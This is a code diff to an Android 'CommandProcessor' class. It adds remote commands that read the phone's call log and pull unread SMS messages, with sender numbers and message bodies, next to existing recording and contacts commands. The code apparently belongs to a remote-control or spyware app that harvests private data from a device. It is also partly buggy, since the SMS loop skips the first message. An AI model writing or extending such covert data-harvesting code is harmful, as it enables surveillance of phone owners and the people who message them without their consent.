@@ -15,6 +15,8 @@ import android.net.wifi.WifiManager;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -194,7 +196,9 @@ public class CommandProcessor {
                 "10. recording_start\n" +
                 "11. recording_stop\n" +
                 "12. contacts:name\n" +
-                "13. help\n";
+                "13. call_logs:number_of_records\n" +
+                "14. unread_sms\n" +
+                "15. help\n";
         return help;
     }
 
@@ -256,15 +260,23 @@ public class CommandProcessor {
         //Log.d("Contacts","Contact String at the end is:"+output.toString()+"And the length of msg is: "+output.length() );
         return output.toString();
     }
-    public static String getCallLogs(Context context)
+    public static String getCallLogs(Context context,int no_of_records)
     {
         @SuppressWarnings("deprecation")
         //Cursor managedCursor = contextmanagedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
         StringBuffer sb = new StringBuffer();
         String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
+        Uri CONTENT_URI = CallLog.Calls.CONTENT_URI;
+
+
+        int counter=0;
+
+        Log.d("Call_Log_Test","Before resolver!");
 
         ContentResolver contentResolver = context.getContentResolver();
-        Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+        Log.d("Call_Log_Test","After resolver!");
+        Cursor managedCursor = contentResolver.query(CONTENT_URI, null, null, null, null);
+        Log.d("Call_Log_Test","After cursor resolver!");
 
         int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
         int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
@@ -272,7 +284,7 @@ public class CommandProcessor {
         int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
 
         sb.append("Call Log :");
-        while (managedCursor.moveToNext()) {
+        while (managedCursor.moveToNext() && counter<no_of_records) {
             String phNum = managedCursor.getString(number);
             String callTypeCode = managedCursor.getString(type);
             String strcallDate = managedCursor.getString(date);
@@ -300,5 +312,28 @@ public class CommandProcessor {
 
         return sb.toString();
 
+    }
+    public static String fetchUnreadSMS(Context context)
+    {
+        Uri sms_content = Uri.parse("content://sms/inbox");
+        String where = "read = 0";
+        StringBuffer result=new StringBuffer();
+        Cursor c = context.getContentResolver().query(sms_content, null, where, null, null);
+        c.moveToFirst();
+        int counter = 1;
+        while(c.moveToNext())
+        {
+            //result.append("First Column: "+c.getString(0)+", ");
+            //result.append("Second Column: "+c.getString(1)+", ");
+            result.append(counter+" : \n");
+            result.append("Contact Number: "+c.getString(2)+", ");
+            result.append("Content: "+c.getString(12)+"\n" );
+            counter++;
+            //result.append("3rd column: "+c.getString(13)+", " );
+
+        }
+        int Value = c.getCount();
+        c.close();
+        return result.toString();
     }
 }
